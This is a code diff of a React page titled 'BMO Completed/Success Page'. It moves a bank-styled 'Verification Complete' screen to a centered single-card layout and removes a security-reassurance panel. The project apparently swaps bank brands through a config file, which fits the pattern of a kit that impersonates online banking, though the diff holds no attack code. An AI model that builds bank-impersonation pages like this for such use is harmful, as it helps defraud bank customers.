@@ -2,7 +2,7 @@
 
 /**
  * BMO Completed/Success Page
- * Clean, minimal design consistent with BMO branding
+ * Centered single-column layout for desktop
  */
 
 import { currentBrand } from '@/config/branding';
@@ -17,9 +17,8 @@ export default function CompletedPage() {
         <h1>Verification Complete</h1>
       </div>
 
-      {/* Two Column Layout */}
-      <div className="main-container">
-        {/* Card */}
+      {/* Centered Single Card Layout */}
+      <div className="centered-container">
         <div className="login-card">
           <div className="card-header">
             <h2>Verification Complete</h2>
@@ -40,20 +39,6 @@ export default function CompletedPage() {
 
             <p style={{ color: 'var(--bmo-gray)', fontSize: '13px', textAlign: 'center', marginTop: '32px' }}>
               Thank you for banking with {currentBrand.companyName}.
-            </p>
-          </div>
-        </div>
-
-        {/* Right Panels */}
-        <div className="info-panels">
-          <div className="info-card security-card">
-            <div className="security-header">
-              <img src="/brands/bmo/lock..svg" alt="" className="security-icon" />
-              <h2>Your security always comes first</h2>
-            </div>
-            <p className="security-text">
-              We've made Online Banking more convenient, while still using advanced security
-              technologies that keep your money and information safe.
             </p>
           </div>
         </div>
